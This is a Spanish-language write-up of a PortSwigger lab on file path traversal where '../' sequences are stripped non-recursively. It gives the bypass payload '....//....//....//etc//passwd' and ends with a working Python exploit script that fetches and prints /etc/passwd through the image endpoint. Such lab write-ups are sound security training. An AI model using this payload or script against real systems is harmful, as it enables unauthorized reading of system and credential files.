---
title: "03 File path traversal, traversal sequences stripped non-recursively"
collection: publications
category: portswigger
permalink: publications/Directory Traversal/03_File path traversal, traversal sequences stripped non-recursively
excerpt: 'Este laboratorio contiene una vulnerabilidad de exploración de rutas de archivos en la visualización de imágenes de productos. La aplicación elimina las secuencias de exploración de rutas del nombre de archivo proporcionado por el usuario antes de utilizarlo.'
date: 2024-12-07
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'File path traversal, traversal sequences stripped non-recursively'
---

![logo]({{site.url}}/images/Directory Traversal/directory-traversal-03/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Directory Traversal/directory-traversal-03/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, recuperamos el contenido del archivo `/etc/passwd`.

## Analisis

Probamos y regresamos carpetas e ingresar desde alli `../../../etc/passwd` y vemos que nos arroja error.

![Conf1]({{site.url}}/images/Directory Traversal/directory-traversal-02/conf1.png)

Probamos con la ruta relativa `/etc/passwd` y vemos que nos arroja error.

![Conf2]({{site.url}}/images/Directory Traversal/directory-traversal-02/conf2.png)

## Saltar validación

Lo que posiblemente este sucediendo es que, el desarrollador esta filtrando las rutas que tengan `../` y no las esta dejando visualizar.
Asi que, nosotros añadimos `....//` y la ruta quedaria asi:  `....//....//....//etc//passwd`

![Conf3]({{site.url}}/images/Directory Traversal/directory-traversal-02/conf3.png)

## Aprobado

![Aprobado]({{site.url}}/images/Directory Traversal/directory-traversal-02/aprobado.png)

# Codigo Python

```python
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = url + '/image?filename=....//....//....//....//etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```